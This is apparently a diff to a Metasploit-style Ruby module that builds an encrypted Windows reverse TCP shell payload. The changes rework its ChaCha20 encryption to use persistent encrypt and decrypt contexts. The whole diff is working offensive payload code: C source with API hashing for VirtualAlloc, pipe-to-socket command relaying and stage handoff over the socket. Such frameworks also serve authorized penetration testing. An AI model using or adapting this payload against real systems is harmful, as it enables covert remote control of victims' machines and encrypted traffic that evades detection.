@@ -102,7 +102,7 @@ module Payload::Windows::EncryptedReverseTcp
     src << stager_comm
   end
 
-  def uuid_hex
+  def sends_hex_uuid?
     true
   end
 
@@ -140,7 +140,9 @@ module Payload::Windows::EncryptedReverseTcp
     src << exec_payload_stage
     shellcode = get_compiled_shellcode(src, comp_opts)
 
-    Rex::Crypto.chacha_encrypt(key, iv, shellcode)
+    stage_obj = Rex::Crypto::Chacha20.new(key, iv)
+    stage_obj.chacha20_crypt(shellcode)
+    #Rex::Crypto.chacha_encrypt(key, iv, shellcode)
   end
 
   def generate_c_src(conf)
@@ -237,6 +239,16 @@ module Payload::Windows::EncryptedReverseTcp
 
   def chacha_func_staged
     %Q^
+      char *chacha_data(char *buf, int len, chacha_ctx *ctx)
+      {
+        chacha_encrypt_bytes(ctx, buf, buf, len);
+        buf[len] = '\\0';
+
+        return buf;
+      }
+    ^
+=begin
+    %Q^
       char *chacha_data(char *buf, int len, char *key, char *nonce)
       {
         chacha_ctx ctx;
@@ -249,9 +261,21 @@ module Payload::Windows::EncryptedReverseTcp
         return buf;
       }
     ^
+=end
   end
 
   def chacha_func
+    %Q^
+      char *chacha_data(char *buf, int len, chacha_ctx *ctx)
+        {
+          FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
+          char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_READWRITE);
+          chacha_encrypt_bytes(ctx, buf, out, len);
+          out[len] = '\\0';
+          return out;
+        }
+    ^
+=begin
     %Q^
       char *chacha_data(char *buf, int len, char *key, char *nonce)
         {
@@ -266,6 +290,7 @@ module Payload::Windows::EncryptedReverseTcp
           return out;
         }
     ^
+=end
   end
 
   def exit_proc
@@ -426,6 +451,14 @@ module Payload::Windows::EncryptedReverseTcp
         char *key = init_key;
         char *nonce = init_nonce;
 
+        chacha_ctx encrypt_ctx;
+        chacha_keysetup(&encrypt_ctx, key, 256, 96);
+        chacha_ivsetup(&encrypt_ctx, nonce);
+
+        chacha_ctx decrypt_ctx;
+        chacha_keysetup(&decrypt_ctx, key, 256, 96);
+        chacha_ivsetup(&decrypt_ctx, nonce);
+
         do
         {
           if(new_key == 0)
@@ -436,10 +469,16 @@ module Payload::Windows::EncryptedReverseTcp
               ExitProcess(term_stat);
             }
 
-            char *res = chacha_data(stream, 44, key, nonce);
+            char *res = chacha_data(stream, 44, &decrypt_ctx);
             key = res + 12;
             nonce = res;
             new_key = 1;
+
+            chacha_keysetup(&encrypt_ctx, key, 256, 96);
+            chacha_ivsetup(&encrypt_ctx, nonce);
+
+            chacha_keysetup(&decrypt_ctx, key, 256, 96);
+            chacha_ivsetup(&decrypt_ctx, nonce);
           }
 
           if(PeekNamedPipe(out, NULL, 0, NULL, &data, NULL) && data > 0)
@@ -448,7 +487,7 @@ module Payload::Windows::EncryptedReverseTcp
             {
               ExitProcess(term_stat);
             }
-            char *cmd = chacha_data(buf, bytes_received, key, nonce);
+            char *cmd = chacha_data(buf, bytes_received, &encrypt_ctx);
             SendData(s, cmd, bytes_received, 0);
             SecureZeroMemory(buf, buf_size);
             VirtualFree(cmd, bytes_received+1, MEM_RELEASE);
@@ -460,7 +499,7 @@ module Payload::Windows::EncryptedReverseTcp
             bytes_received = RecvData(s, buf, buf_size-1, 0);
             if(bytes_received > 0)
             {
-              char *dec_cmd = chacha_data(buf, bytes_received, key, nonce);
+              char *dec_cmd = chacha_data(buf, bytes_received, &decrypt_ctx);
               WriteFile(in, dec_cmd, bytes_received, &bytes_written, NULL);
               SecureZeroMemory(buf, buf_size);
               VirtualFree(dec_cmd, bytes_received+1, MEM_RELEASE);
@@ -565,7 +604,12 @@ module Payload::Windows::EncryptedReverseTcp
 
         char key[] = { #{format_ds_opt(datastore['ChachaKey'])} };
         char nonce[] = { #{format_ds_opt(datastore['ChachaNonce'])} };
-        chacha_data(received, stage_size + 1, key, nonce);
+
+        chacha_ctx dec_ctx;
+        chacha_keysetup(&dec_ctx, key, 256, 96);
+        chacha_ivsetup(&dec_ctx, nonce);
+        chacha_data(received, stage_size + 1, &dec_ctx);
+
         // hand the socket to the stage
         asm("#{inst} %0, %%#{reg}"
             :
